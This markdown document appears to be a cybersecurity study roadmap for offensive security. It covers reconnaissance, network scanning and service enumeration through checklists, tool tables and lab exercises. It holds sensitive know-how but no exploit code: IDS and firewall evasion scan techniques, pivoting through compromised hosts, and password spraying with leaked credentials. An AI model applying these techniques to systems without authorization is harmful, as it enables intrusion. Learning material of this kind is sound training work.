# Stage 2: Offense I

---

### 🧭 Navigation

◀ [Stage 1: Foundation](Stage-1_Foundation.md) | 🏠 [Master Roadmap](README.md) | [Stage 3: Web & App Sec](Stage-3_Web-and-App-Sec.md) ➔

---

> [!NOTE]
> **Phase Overview**
>
> - **⏱️ Time Commitment (Full-Time):** 5–7 months
> - **⏱️ Time Commitment (Part-Time):** 8–12 months
> - **🎯 Primary Focus:** The complete offensive lifecycle from recon to impact. Split into two sub-phases: **Phase 2A** (Offensive Fundamentals — recon, scanning, enumeration, credential attacks, system hacking) and **Phase 2B** (Advanced Offensive Operations — malware, sniffing/spoofing, social engineering, denial-of-service, session hijacking).

---

> [!NOTE]
>
> ### 📝 Phase 2 Documentation Requirements
>
> Every attack you execute must be documented. Required artifacts:
>
> - **Pentest notes** in structured markdown (target → recon → exploitation → post-exploitation → findings)
> - **Tool output** — [Nmap](Tools/Nmap.md) scans, Burp captures, [Metasploit](Tools/Metasploit_Framework.md) session logs saved to files
> - **Attack chain diagrams** showing the kill chain for each compromise
> - **3 HTB/VulnHub writeups** — full writeups committed to Git (private until published)
> - **Git commits** — commit after every lab session with descriptive messages
>
> _By the end of Phase 2, you should have 10+ documented attack chains in your repository._

> [!IMPORTANT]
> ### 🛠️ Mandatory Tool Stack (Must Master in This Phase)
>
> | Priority | Tool | Purpose & Core Skills |
> | :--- | :--- | :--- |
> | **Tier 1 (Mandatory)** | [Nmap](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Nmap.md) | Host discovery, port scanning, service banner grabbing, NSE script auditing (`-sC -sV`). |
> | **Tier 1 (Mandatory)** | [Netcat](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Netcat.md) / `socat` | Port binding, raw banner interaction, listener setup, encrypted reverse/bind shells. |
> | **Tier 1 (Mandatory)** | [Responder](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Responder.md) | LLMNR/NBT-NS/mDNS spoofing, rogue WPAD proxy poisoning, NetNTLMv1/v2 hash harvesting. |
> | **Tier 1 (Mandatory)** | [Hashcat](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Hashcat.md) | GPU password cracking, rule-based attacks (`best64.rule`), hash-mode identification (`-m 5600`). |
> | **Tier 1 (Mandatory)** | [Metasploit Framework](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Metasploit_Framework.md) | Modular exploitation, auxiliary scanning, payload generation (`msfvenom`), Meterpreter navigation. |
> | **Tier 2 (Secondary)** | [theHarvester](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/theHarvester.md) & [Amass](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Amass.md) | Passive OSINT, subdomain enumeration, organization surface mapping. |
> | **Tier 2 (Secondary)** | [Hydra](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Hydra.md) & [John the Ripper](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/John_the_Ripper.md) | Online network service brute-forcing (SSH/SMB/FTP) and offline password hash cracking. |
> | **Tier 2 (Secondary)** | [LinPEAS](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/LinPEAS.md) & [WinPEAS](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/WinPEAS.md) | Automated local privilege escalation vector enumeration on Linux and Windows targets. |
>
> **Phase Exit Tool Gate:** You cannot pass Phase 2 until you can scan a target subnet with `Nmap`, poison an internal broadcast query using `Responder`, crack the harvested NetNTLMv2 hash using `Hashcat`, exploit an unpatched service, and catch a stable reverse shell using `Netcat`.

---

### 🗂️ Table of Contents

- [Part 4: Footprinting and Reconnaissance](#part-4-footprinting-and-reconnaissance)
  - [Stage 1: The "Ghost" Phase (Passive OSINT & Human Profiling)](#part-4-stage-1-ghost-phase)
  - [Stage 2: Semi-Passive Infrastructure Mapping](#part-4-stage-2-semi-passive-infrastructure-mapping)
  - [Stage 3: Active Footprinting & Network Interrogation](#part-4-stage-3-active-footprinting-network-interrogation)
  - [Stage 4: Advanced Fingerprinting & Logic Analysis](#part-4-stage-4-advanced-fingerprinting-logic-analysis)
  - [Stage 5: IPv6 & Protocol Enumeration](#part-4-stage-5-ipv6-protocol-enumeration)
  - [Stage 6: Dark Web & Breach Intelligence](#part-4-stage-6-dark-web-breach-intelligence)
  - [Stage 7: Satellite & Geospatial Intelligence](#part-4-stage-7-satellite-geospatial-intelligence)
  - [Stage 8: Strategy & Attack Mapping](#part-4-stage-8-strategy-attack-mapping)
  - [Lab Progression (Part 4: Footprinting and Reconnaissance)](#part-4-lab-progression)
- [Part 5: Scanning](#part-5-scanning)
  - [Stage 1: Host Discovery & Network Topology (The "Roll Call")](#stage-1-host-discovery-network-topology-the-roll-call)
  - [Stage 2: Port, Service & Protocol Enumeration (The "Door Check")](#stage-2-port-service-protocol-enumeration-the-door-check)
  - [Stage 3: Defense & Configuration Assessment (The "Armor Check")](#stage-3-defense-configuration-assessment-the-armor-check)
  - [Stage 4: Vulnerability Association & Attack Mapping](#stage-4-vulnerability-association-attack-mapping)
  - [Stage 5: Stealth & Evasion Techniques](#stage-5-stealth-evasion-techniques)
  - [Stage 6: Advanced Scanning Techniques](#stage-6-advanced-scanning-techniques)
  - [Lab Progression (Part 5: Scanning)](#lab-progression-part-5-scanning)
- [Part 6: Enumeration](#part-6-enumeration)
  - [Stage 1: Service Enumeration & Banner Grabbing](#stage-1-service-enumeration-banner-grabbing)
  - [Stage 2: Directory & Identity Enumeration](#stage-2-directory-identity-enumeration)
  - [Stage 3: DNS & Infrastructure Enumeration](#stage-3-dns-infrastructure-enumeration)
  - [Stage 4: Database & Application Enumeration](#stage-4-database-application-enumeration)
  - [Stage 5: Attack Surface Consolidation & Enumeration OpSec](#stage-5-attack-surface-consolidation-enumeration-opsec)
  - [Lab Progression (Part 6: Enumeration)](#lab-progression-part-6-enumeration)
- [Part 6B: Database Security](#part-6b-database-security) ← NEW
  - [Stage 1: Database Enumeration & Fingerprinting](#part-6b-stage-1-database-enumeration-fingerprinting)
  - [Stage 2: Relational Database Exploitation](#part-6b-stage-2-relational-database-exploitation)
  - [Stage 3: NoSQL & Modern Database Attacks](#part-6b-stage-3-nosql-modern-database-attacks)
  - [Stage 4: Database Privilege Escalation](#part-6b-stage-4-database-privilege-escalation)
  - [Stage 5: Database Auditing & Defence](#part-6b-stage-5-database-auditing-defence)
  - [Lab Progression (Part 6B: Database Security)](#part-6b-lab-progression)
- [Part 31: Password Cracking & Hash Analysis](#part-31-password-cracking-hash-analysis)
  - [Stage 1: Hash Identification & Acquisition](#stage-1-hash-identification-acquisition)
  - [Stage 2: Cracking Methodology & Tools](#stage-2-cracking-methodology-tools)
  - [Stage 3: Protocol-Specific Cracking](#stage-3-protocol-specific-cracking)
  - [Stage 4: Wordlist & Intelligence Curation](#stage-4-wordlist-intelligence-curation)
- [Part 7: System Hacking & Initial Compromise](#part-7-system-hacking-initial-compromise)
  - [Stage 1: The Breach (Initial Access & Exploitation)](#stage-1-the-breach-initial-access-exploitation)
  - [Stage 2: The Ascension (Privilege Escalation)](#stage-2-the-ascension-privilege-escalation)
  - [Stage 3: The Stronghold (Persistence & Lateral Movement)](#stage-3-the-stronghold-persistence-lateral-movement)
  - [Stage 4: The Shadow (Defense Evasion & Anti-Forensics)](#stage-4-the-shadow-defense-evasion-anti-forensics)
  - [Stage 5: Data Exfiltration & Impact](#stage-5-data-exfiltration-impact)
  - [Stage 6: The Professional (Governance & Reporting)](#stage-6-the-professional-governance-reporting)
  - [Lab Progression (Part 7: System Hacking & Initial Compromise)](#lab-progression-part-7-system-hacking-initial-compromise)
- [Part 8: Malware & Weaponization](#part-8-malware-weaponization)
  - [Stage 1: The Design & Logic (Architecture)](#stage-1-the-design-logic-architecture)
  - [Stage 2: The Payload & Mechanism (Weaponization)](#stage-2-the-payload-mechanism-weaponization)
  - [Stage 3: Evasion & Defense Bypassing (Invisibility)](#stage-3-evasion-defense-bypassing-invisibility)
  - [Stage 4: Persistence & Escalation (Entrenchment)](#stage-4-persistence-escalation-entrenchment)
  - [Stage 5: Counter-Forensics & Professionalism (The Cleanup)](#stage-5-counter-forensics-professionalism-the-cleanup)
  - [Stage 6: Document & Cloud Weaponization](#stage-6-document-cloud-weaponization)
- [Part 9: Sniffing & Spoofing](#part-9-sniffing-spoofing)
  - [Stage 1: The Environment & Fundamentals (The Setup)](#stage-1-the-environment-fundamentals-the-setup)
  - [Stage 2: Sniffing & Passive Reconnaissance (The Ear)](#stage-2-sniffing-passive-reconnaissance-the-ear)
  - [Stage 3: Spoofing & Active Deception (The Lie)](#stage-3-spoofing-active-deception-the-lie)
  - [Stage 4: Man-in-the-Middle & Exploitation (The Kill)](#stage-4-man-in-the-middle-exploitation-the-kill)
  - [Stage 5: Defenses & Mitigation (The Shield)](#stage-5-defenses-mitigation-the-shield)
  - [Lab Progression (Part 9: Sniffing & Spoofing)](#lab-progression-part-9-sniffing-spoofing)
- [Part 10: Social Engineering](#part-10-social-engineering)
  - [Stage 1: Intelligence & Reconnaissance (The Setup)](#stage-1-intelligence-reconnaissance-the-setup)
  - [Stage 2: The Digital Assault (Remote Vectors)](#stage-2-the-digital-assault-remote-vectors)
  - [Stage 3: The Human Element (Direct Interaction)](#stage-3-the-human-element-direct-interaction)
  - [Stage 4: The Physical Breach (Boots on the Ground)](#stage-4-the-physical-breach-boots-on-the-ground)
  - [Stage 5: Defense & Awareness (The Shield)](#stage-5-defense-awareness-the-shield)
  - [Lab Progression (Part 10: Social Engineering)](#lab-progression-part-10-social-engineering)
- [Part 11: Denial of Service](#part-11-denial-of-service)
  - [Stage 1: Objective & Strategy (The Planning)](#stage-1-objective-strategy-the-planning)
  - [Stage 2: The Arsenal (Attack Methods)](#stage-2-the-arsenal-attack-methods)
  - [Stage 3: Infrastructure & Execution (The Assault)](#stage-3-infrastructure-execution-the-assault)
  - [Stage 4: Defense & Mitigation (The Shield)](#stage-4-defense-mitigation-the-shield)
  - [Lab Progression (Part 11: Denial of Service)](#lab-progression-part-11-denial-of-service)

---

## 🔹 Phase 2A: Offensive Fundamentals

> _Parts 4–7 + 31 — Learn to find, probe, crack, and compromise targets. This is the core recon-to-shell pipeline._

> [!IMPORTANT]
> **Phase 2A Internal Execution Order** — Follow this Part sequence. Part numbers are not chronological; this is the correct dependency order:
>
> | Step | Part                                                              | Focus                               | Dependency                               |
> | ---- | ----------------------------------------------------------------- | ----------------------------------- | ---------------------------------------- |
> | 1    | **[Part 4](Stage-2_Offense-I.md#part-4-footprinting-and-reconnaissance)**   | Footprinting & Reconnaissance       | None — start here                        |
> | 2    | **[Part 5](Stage-2_Offense-I.md#part-5-scanning)**                          | Scanning                            | Part 4 complete                          |
> | 3    | **[Part 6](Stage-2_Offense-I.md#part-6-enumeration)**                       | Enumeration                         | Part 5 complete                          |
> | 4    | **[Part 6B](Stage-2_Offense-I.md#part-6b-database-security)**               | Database Security                   | Part 6 complete                          |
> | 5    | **[Part 31](Stage-2_Offense-I.md#part-31-password-cracking-hash-analysis)** | Password Cracking & Hash Analysis   | Part 6 complete — required before Part 7 |
> | 6    | **[Part 7](Stage-2_Offense-I.md#part-7-system-hacking-initial-compromise)** | System Hacking & Initial Compromise | Parts 6, 6B, 31 complete                 |
>
> **Why this order?**
>
> ```text
> What exists?               → Part 4 (Recon)
> Where is it?               → Part 5 (Scanning)
> What services are running? → Part 6 (Enumeration)
> What databases expose?     → Part 6B (Database Security)
> Can I use credentials?     → Part 31 (Password Cracking)
> Can I gain/escalate?       → Part 7 (System Hacking)
> ```

> [!NOTE]
> **Phase 2A Exit Gate — do NOT enter Phase 2B until you can demonstrate all of these:**
>
> - Perform reconnaissance and enumeration **without jumping to Metasploit immediately**
> - Identify open ports, running services, and software versions on a target
> - Crack a captured hash using a wordlist and rules
> - Gain initial access via at least two different vectors (e.g., exploit + credential reuse)
> - Escalate privileges on both **Linux** (SUID, sudo misconfig, cron, PATH injection) and **Windows** (unquoted service paths, SeImpersonate, token impersonation)
> - Establish a persistence mechanism
> - Document the full attack chain in a structured report
>
> **Evidence required before moving to Phase 2B:**
>
> - Attack chain diagram committed to Git
> - Lab notes (target → recon → exploitation → post-exploitation → findings)
> - At least 1 completed HTB/THM machine writeup covering the full chain

---

<a id="part-4-footprinting-and-reconnaissance"></a>


---

<a id="module-08-footprinting--reconnaissance"></a>
<a id="part-4-footprinting-and-reconnaissance"></a>

## Module 08: Footprinting & Reconnaissance


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `The Hacker Playbook 2` — Chapter 1: Recon section — real-world attacker passive + active OSINT methodology
> - 🔴 `Red Team Field Manual v3` — ⚡ Keep open always as command reference
> - 🟡 `Counter Hack Reloaded - Ed Skoudis & Tom Liston` — Recon chapters — structured methodology for the full recon pipeline
> - 🟡 `Cybersecurity Attack-and-Defense Strategies 2nd` — Reconnaissance chapter — how defenders see your recon footprint (OPSEC awareness)
> - 🟢 `Python for OSINT Tooling` — Full book — build your own OSINT automation tools in Python


<a id="part-4-stage-1-ghost-phase"></a>

### **Stage 1: The "Ghost" Phase (Passive OSINT & Human Profiling)** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Maximum data acquisition with zero target interaction.

- [x] **Organizational Hierarchy:** Profile the **Audience** (Stakeholders, HR, Legal, Management) to understand who holds the keys and who is the weakest link.

- [x] **Search Engine Hacking:** Use **Google Dorks** (`site:`, `filetype:`, `intitle:`) to find exposed documents and login portals.

- [x] **Social Vector Mapping:** Scrape LinkedIn and professional sites to identify targets for **Phishing, Whishing, Whaling, or Smishing** based on reported tech stacks.

- [x] **Physical Perimeter Assessment:** Evaluate the likelihood of **Shoulder Surfing, Tailgating, or Dumpster Diving** vulnerabilities.

- [x] **Metadata & Leak Analysis:** Use **Wayback Machine** for historical paths and **GitHub/GitLab Dorking** for hardcoded API keys or internal naming conventions.

- [x] **Domain & Ownership:** Perform **WHOIS Lookups** to identify registration dates, contact info, and associated subdomains.

- [x] **Passive DNS & CT:** Pull **passive DNS** and **Certificate Transparency (crt.sh)** to surface shadow subdomains and SANs; cluster hosting/ASN/country.

- [x] **Breach & Paste Monitoring:** Check **breach corpuses** (HIBP/Dehashed) and pastes/code search for leaked creds, API keys, or internal hostnames.

- [x] **Mail Posture Recon:** Review **SPF/DMARC/DKIM** to assess spoofing risk and likely mail providers.

---

<a id="part-4-stage-2-semi-passive-infrastructure-mapping"></a>


### **Stage 2: Semi-Passive Infrastructure Mapping** — `🔬 Practical`

> [!TIP]
> **Goal:** Querying third-party aggregators to see what the world already knows about them.

- [x] **External Intel Scouring:** Query **VirusTotal, urlscan, any.run, Joe Sandbox, and urlvoid** for existing malware samples or documented domain behavior.

- [ ] **Third-Party Scans:** Use **Shodan & Censys** to find open ports, outdated services, and geographical distribution without scanning the target yourself.

- [ ] **Subdomain & DNS Enumeration:** Use **Sublist3r/Amass** for subdomains and check **DNS records** (MX, TXT, NS) to map mail providers and third-party integrations.

- [ ] **Protocol Audit:** Identify if the target is clinging to **Insecure Protocols** (FTP vs. SFTP, SSL vs. TLS).

- [ ] **WAF/CDN/TLS Fingerprinting:** Detect **WAF/CDN** fronting via **JA3/JA4, HTTP header quirks, TLS ALPN/HTTP2**, and favicon hashes.

- [ ] **VHost & Favicon Hunts:** Bruteforce **vhosts/domains** and use **favicon hash**/HTTP header diffs to find hidden apps.
---

<a id="part-4-stage-3-active-footprinting-network-interrogation"></a>

### **Stage 3: Active Footprinting & Network Interrogation** — `🔬 Practical`

> [!TIP]
> **Goal:** Direct contact to map the live network fabric. Risk of detection is now ACTIVE.

- [ ] **Live Host Discovery:** Use **ping, arp, and hping** to identify which internal or external assets are actually breathing.

- [ ] **Network Path Analysis:** Use **tracert** to map the hops and identify **Perimeter vs. DMZ vs. Segmentation** boundaries.

- [ ] **Surgical Port Scanning:** Execute **Nmap Essentials** (starting with `-sS` stealth scans) to identify listening services and **OS Fingerprinting**.

- [ ] **Aggressive DNS Interrogation:** Use **nslookup and dig** to force the disclosure of hidden internal records or mail servers.

- [ ] **Web Content Discovery:** Run **[ffuf](Tools/ffuf.md) or [Gobuster](Tools/Gobuster.md)** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).

- [ ] **TLS Surface:** Harvest **cert SANs**, check **cipher/curve** support, **HTTP/2/ALPN** negotiation, and redirect/downgrade behavior.

- [ ] **Web Route Mapping:** Parse **robots.txt/sitemap.xml** and fuzz **parameters/paths** with status/length filters to uncover hidden routes.

---

<a id="part-4-stage-4-advanced-fingerprinting-logic-analysis"></a>

### **Stage 4: Advanced Fingerprinting & Logic Analysis** — `🔬 Practical`

> [!TIP]
> **Goal:** Understand the defensive "brain" of the target.

- [ ] **Traffic Analysis:** If vantage is gained, use **[Wireshark](Tools/Wireshark.md)** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.

- [ ] **Defensive Profiling:** Identify the presence of **IDS/IPS, SIEM, SOAR, and EDR/DLP**. If found, slow down your operation immediately.

- [ ] **Unintended Binary Research:** Map the target's OS to potential **LOLBAS, GTFOBins, or WADCOMS** vectors for later movement. _(See Part 7, Phase 2 for canonical LOLBAS/GTFOBins coverage.)_

- [ ] **Version-to-CVE Correlation:** Cluster hosts by **banners/JA3/favicons** and map exposed versions to **CVE** candidates before exploitation.

---

<a id="part-4-stage-5-ipv6-protocol-enumeration"></a>

### **Stage 5: IPv6 & Protocol Enumeration** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Discover targets using newer protocols and dual-stack networks.

- [ ] **IPv6 Reconnaissance:** Identify **IPv6 addresses** via **Shodan, Censys, IPv6 address enumeration tools** even when IPv4 is locked down.

- [ ] **Link-Local Discovery:** Scan for **link-local addresses** to discover local IPv6 devices and address schemes.

- [ ] **DHCPv6 Enumeration:** Use **DHCPv6 client** to extract **prefix, DNS servers, domain names** from DHCP responses.

- [ ] **SNMP Enumeration:** Query **SNMP community [strings](Tools/strings.md)** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.

- [ ] **LDAP Probing:** Query **LDAP** on **port 389** to enumerate **users, groups, organizational structure, computer objects**.

- [ ] **NFS Shares:** Probe for **NFS exports** on **port 2049** and attempt to mount for **file enumeration and exfiltration**.

- [ ] **RPC Enumeration:** Use **rpcclient, nmap NSE** to interrogate **RPC services** on **port 135/445** for **users, groups, shares**.

---

<a id="part-4-stage-6-dark-web-breach-intelligence"></a>

### **Stage 6: Dark Web & Breach Intelligence** — `🔬 Practical`

> [!TIP]
> **Goal:** Uncover intelligence from dark web and historical breaches.

- [ ] **Dark Web Searches:** Use **Tor, I2P**, or dedicated **dark web search engines** to find **leaked corporate data, stolen creds, threat reports**.

- [ ] **Breach Corpus Searching:** Query **Dehashed, Have I Been Pwned, Shodan**, and **breach databases** for **employee emails, leaked credentials, domain info**.

- [ ] **Threat Actor Profiling:** Identify relevant **APT groups, cybercrime forums, adversary tradecraft** that target your industry.

- [ ] **Ransomware Gang Sites:** Monitor **ransomware operator sites** for **leaked data, victim announcements, negotiation demands**.

- [ ] **Credential Stuffing Data:** Leverage **leaked cred combos** for **password spray, targeted phishing, VPN/email access**.

---

<a id="part-4-stage-7-satellite-geospatial-intelligence"></a>

### **Stage 7: Satellite & Geospatial Intelligence** _(Optional — Skip unless physical pentest is in scope)_ — `🧠🔬 Mixed`

> [!WARNING]
> **OPTIONAL — Skip in standard engagements.** This stage covers passive OSINT using publicly available satellite imagery (Google Earth Pro, Sentinel Hub) and geospatial data for physical site reconnaissance. It is only relevant if you are conducting an authorized physical penetration test where facility layout matters.
>
> For standard corporate network/web pentesting and Red Team engagements, skip this stage entirely and proceed to **Stage 8: Strategy & Attack Mapping**. Do not schedule dedicated study time here.

- [ ] _[Optional]_ For authorized physical pentest scopes only: Use **Google Earth Pro, Sentinel Hub, ipinfo.io, bgp.he.net** to map physical facility layout, data center locations, and IP infrastructure before an on-site engagement.

---

<a id="part-4-stage-8-strategy-attack-mapping"></a>

### **Stage 8: Strategy & Attack Mapping** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Convert raw data into an execution plan.

- [ ] **Security Architecture Classification:** Determine if they are utilizing **Zero Trust** or standard **MFA & 2FA**.

- [ ] **Framework Alignment:** Map your findings against the **Cyber Kill Chain, Diamond Model, or MITRE ATT&CK**.

- [ ] **Vulnerability Finalization:** Decide the entry vector based on recon: **SQL Injection, MITM, or Brute Force**.

---

<a id="part-4-lab-progression"></a>

### **Lab Progression (Part 4: Footprinting and Reconnaissance)**

| Level | Task                                                                    | Deliverable                                                     |
| ----- | ----------------------------------------------------------------------- | --------------------------------------------------------------- |
| 1     | Perform passive recon on a bug bounty target using only OSINT tools     | Reconnaissance report (domains, subdomains, emails, tech stack) |
| 2     | Use Google Dorks to find exposed files on a permitted target            | Dork queries + findings document                                |
| 3     | Enumerate subdomains using 3+ tools (Sublist3r, Amass, crt.sh)          | Combined subdomain list with deduplication                      |
| 4     | Map a target's full DNS infrastructure (MX, NS, TXT, CNAME)             | DNS map diagram                                                 |
| 5     | Perform active recon on a home lab target (traceroute, banner grabbing) | Active recon report                                             |

> [!IMPORTANT]
> **Move-On Gate:** You can produce a complete reconnaissance report on an unfamiliar target using both passive and active techniques, identify the technology stack, and prioritize attack surface areas.

---

<a id="toc-part-5-scanning"></a>
<a id="part-5-scanning"></a>


---

<a id="module-09-scanning"></a>
<a id="part-5-scanning"></a>

## Module 09: Scanning


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `Red Team Field Manual v3` — ⚡ Keep open during all scanning labs
> - 🟡 `Ethical Hacking A Hands-on Introduction to Breaking In` — Scanning & fingerprinting chapters — hands-on Nmap and service enumeration
> - 🟡 `The Power of Scapy V2` — Full (short reference) — custom packet crafting for advanced scanning
> - 🟡 `Wireshark Cheat Sheet` — Keep open during all packet capture analysis labs
> - 🟢 `Hacking and Network Defense` — Network scanning chapter — how scan traffic appears in defender logs


<a id="stage-1-host-discovery-network-topology-the-roll-call"></a>

### **Stage 1: Host Discovery & Network Topology (The "Roll Call")** — `🔬 Practical`

> [!TIP]
> **Goal:** Identify live assets without wasting time on dead IPs or triggering ICMP alarms.

- [ ] **ARP Discovery:** Use `arp-scan` or `nmap -PR` for local segment discovery to bypass host firewalls that drop ICMP.

- [ ] **ICMP & TCP/UDP Sweeps:** Perform standard `ping` sweeps or use `nmap -PS/-PU` (ports 80, 443, 53) to find external hosts that block standard pings.

- [ ] **Passive Traffic Capture:** Utilize **Wireshark** to capture broadcast traffic, revealing active hosts without sending a single packet.

- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `[hping3](Tools/hping3.md) --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.

- [ ] **IPv6 Discovery:** Include **NDP/`nmap -6`** sweeps for dual-stack assets and SLAAC-derived hosts.

---

<a id="stage-2-port-service-protocol-enumeration-the-door-check"></a>

### **Stage 2: Port, Service & Protocol Enumeration (The "Door Check")** — `🔬 Practical`

> [!TIP]
> **Goal:** Determine exactly what applications are running and how they communicate.

- [ ] **Stealth SYN Scanning:** Use `nmap -sS` to identify open ports without completing the three-way **Handshake**, minimizing your footprint in application logs.

- [ ] **Version & OS Fingerprinting:** Deploy `nmap -sV` for service banners and `nmap -O` to analyze TCP/IP stack responses for **Operating System Hardening** clues.

- [ ] **Protocol Audit:** Analyze discovered services to determine if they use **Secure vs Insecure Protocols** (e.g., FTP vs SFTP, SSL vs TLS).

- [ ] **Connection Handshake Analysis:** Examine **Handshakes** to understand the specific authentication and encryption methods protecting the service.

- [ ] **UDP Surface Check:** Do not ignore `nmap -sU` for often-overlooked services like DNS (53), SNMP (161), and DHCP (67).

- [ ] **Timing & Hygiene:** Apply sane **-T profiles**, exclusion lists, and prefer **safe NSE** scripts before vuln categories to avoid tripping controls.

- [ ] **IPv6 Stack:** Mirror key scans with **`nmap -6`** for IPv6 services.

---

<a id="stage-3-defense-configuration-assessment-the-armor-check"></a>

### **Stage 3: Defense & Configuration Assessment (The "Armor Check")** — `🔬 Practical`

> [!TIP]
> **Goal:** Identify security controls that will attempt to block or alert on your presence.

- [ ] **Firewall & ACL Enumeration:** Detect the presence of a **Firewall & Nextgen Firewall** or **Host Based Firewalls** by analyzing filtered ports and **ACL** (Access Control List) behavior.

- [ ] **IDS/IPS Probing:** Use fragmentation (`-f`) or timing decoys (`-D`) to identify active **NIDS, NIPS, or HIPS** systems that may block aggressive patterns.

- [ ] **Web Surface Discovery:** Use `ffuf` or `Gobuster` for **Directory Brute-forcing** to find hidden `/admin` or `/config` panels that are not linked publicly.

- [ ] **Service-Specific Enum:** Targeted checks for **SMB/RPC/WinRM**, **LDAP/Kerberos (AS-REP preauth, SPNs)**, **SNMP v1/v2c/v3**, **SMTP VRFY/EXPN**, **SSH KEX/ciphers**, **RDP/NLA**, **DBs (MySQL/MSSQL/Postgres)**, **Redis/Mongo/Elastic**.

---

<a id="stage-4-vulnerability-association-attack-mapping"></a>

### **Stage 4: Vulnerability Association & Attack Mapping** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Convert raw scan data into actionable exploitation vectors.

- [ ] **Scripted Vulnerability Probing:** Use the **Nmap Scripting Engine (NSE)** (`--script vuln`) to check for known **Zero Day** or common exploits in identified versions.

- [ ] **Attack Surface Selection:** Match findings to your known **Common Attacks**—e.g., **SQL Injection** for web servers or **Buffer Overflows** for legacy binaries.

- [ ] **Traffic Intelligence:** Finalize your plan by inspecting **Packet Captures** for cleartext protocols or weak encryption that allows for **MITM** or **Replay Attacks**.

- [ ] **Cluster & Correlate:** Group hosts by **banners/JA3/favicons** and map versions to likely **CVEs** before exploitation.

---

<a id="stage-5-stealth-evasion-techniques"></a>

### **Stage 5: Stealth & Evasion Techniques** — `🔬 Practical`

> [!TIP]
> **Goal:** Scan without detection by firewalls, IDS, and EDR.

- [ ] **Fragmentation & Decoys:** Use `nmap -f` (fragment packets) or `-D` (decoy IPs) to evade **NIDS/NIPS signature detection**.

- [ ] **Timing Profiles:** Apply appropriate `-T` profile (T0-T5) to avoid triggering **rate-based IDS rules** or **adaptive firewalls**.

- [ ] **Null/FIN/Xmas Scans:** Use alternative scan types (`nmap -sN/-sF/-sX`) that bypass **stateless firewalls** but may not work through **stateful firewalls**.

- [ ] **ACK Scanning:** Use `-sA` to map **firewall rule sets** without attempting to establish connections.

- [ ] **Idle/Zombie Scanning:** Use `-sI` with a **zombie host** to perform **blind port scans** that don't directly originate from your IP.

- [ ] **Source Port Spoofing:** Use `--source-port 53/80` to impersonate **DNS/HTTP traffic** and bypass port-based **ACL rules**.

- [ ] **Packet Manipulation:** Craft **custom packets** with **[Scapy](Tools/Scapy.md)** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.

---

<a id="stage-6-advanced-scanning-techniques"></a>

### **Stage 6: Advanced Scanning Techniques** — `🔬 Practical`

> [!TIP]
> **Goal:** Optimize scanning efficiency and discover hidden services.

- [ ] **Parallel & Distributed Scanning:** Use **masscan** for rapid scanning of large ranges; distribute scans across **multiple IPs/proxies** to avoid threshold detection.

- [ ] **Custom Probes & NSE Scripting:** Write **NSE scripts** for **service-specific probing** (e.g., extracting **SANs from TLS**, **banner grabbing**, **service enumeration**).

- [ ] **WAF/CDN Bypass:** Identify backend IPs via **DNS history, SSL cert mismatches, HTTP header fingerprints**, and scan directly if possible.

- [ ] **Certificate Transparency (CT) Recon:** Parse **CT logs** to discover **hidden subdomains, domain variants, and organization structure**.

- [ ] **Reverse DNS Lookup:** Use **reverse DNS** to discover **vhosts, services, and hostnames** associated with IP ranges.

- [ ] **Proxychains & Proxy Pivoting:** Route scans through **VPNs, proxies, compromised hosts** to obscure source IP and bypass **geographic restrictions**.

<a id="lab-progression-part-5-scanning"></a>

### **Lab Progression (Part 5: Scanning)**

| Level | Task                                                          | Deliverable                     |
| ----- | ------------------------------------------------------------- | ------------------------------- |
| 1     | Scan a home lab subnet with Nmap (host discovery + port scan) | Nmap output report              |
| 2     | Perform service version detection and OS fingerprinting       | Annotated scan results          |
| 3     | Write a custom NSE script to detect a specific vulnerability  | Working .nse script             |
| 4     | Scan a target through a proxy chain / VPN tunnel              | Scan results + stealth analysis |
| 5     | Compare scan results with and without IDS evasion techniques  | Evasion effectiveness report    |

> [!IMPORTANT]
> **Move-On Gate:** You can discover all live hosts and open ports on a /24 subnet, identify service versions and OS types, and adapt scan techniques to evade basic IDS detection.

---

<a id="toc-part-6-enumeration"></a>
<a id="part-6-enumeration"></a>


---

<a id="module-10-enumeration"></a>
<a id="part-6-enumeration"></a>

## Module 10: Enumeration


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `Hacking Exposed` — Service-specific chapters (SMB, SNMP, LDAP, RPC) — classic enumeration playbook, still directly applicable
> - 🟡 `Counter Hack Reloaded - Ed Skoudis & Tom Liston` — Enumeration chapters (SMB, LDAP, SNMP) — structured per-protocol coverage and what data each leaks
> - 🟢 `Cyberjutsu Cybersecurity for the Modern Ninja` — Enumeration section — attacker-focused methodology in clear tactical language


> [!NOTE]
> **Note:** Part 5 (Scanning) covers host discovery, port scanning, and defense identification. Part 6 focuses specifically on **extracting detailed information from discovered services** to build an attack profile. If you haven't completed Part 5, do so first.

<a id="stage-1-service-enumeration-banner-grabbing"></a>

### **Stage 1: Service Enumeration & Banner Grabbing** — `🔬 Practical`

> [!TIP]
> **Goal:** Extract version, configuration, and identity information from each discovered service.

- [ ] **Banner Grabbing:** Use **[Netcat](Tools/Netcat.md), Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
